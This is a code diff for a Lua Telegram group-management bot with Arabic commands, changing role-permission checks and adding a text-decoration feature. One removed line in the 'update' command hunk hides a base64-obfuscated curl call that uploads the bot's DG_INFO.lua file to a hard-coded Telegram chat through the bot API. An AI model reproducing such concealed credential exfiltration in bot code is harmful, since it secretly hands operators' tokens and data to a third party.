@@ -250,7 +250,7 @@ end
 end
 function Manager(msg)
 local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then
 return true    
 else    
 return false    
@@ -258,7 +258,7 @@ end
 end
 function cleaner(msg)
 local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Manager(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then
 return true    
 else    
 return false    
@@ -274,7 +274,7 @@ end
 end
 function Special(msg)
 local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or cleaner(msg) or CoSu(msg) or Bot(msg)  then       
 return true 
 else 
 return false 
@@ -3490,9 +3490,10 @@ send(msg.chat_id_, msg.id_,' ✪︙ تم فتح التكرار')
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' or text == 'تحديث ✪' and DevSoFi(msg) then    
-dofile('DRAGON.lua')  
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 send(msg.chat_id_, msg.id_, ' ✪︙ تم تحديث جميع الملفات') 
+dofile('DRAGON.lua')
+dofile('File_Bot/Reply.lua')
+dofile('File_Bot/anamen.lua')
 end 
 if text == ("مسح الحظر العام") and DevSoFi(msg) then
 database:del(bot_id..'GBan:User')
@@ -11537,6 +11538,10 @@ end
 if text == "تفعيل الزخرفه" and Manager(msg) then
 send(msg.chat_id_, msg.id_,'✪︙ تم تفعيل الزخرفه')
 database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
+end
+if text == 'زخرفه' and Manager(msg) or text == 'الزخرفه' and Manager(msg)  then  
+database:set(bot_id.."sofi:zhrf_Bots"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
+send(msg.chat_id_, msg.id_, 1, '❀  لي الكلمه لزخرفتها \n❀  الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
 end
 if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf_Bots"..msg.chat_id_) == "open" then
 local TextZhrfa = text:match("^زخرفه (.*)$")
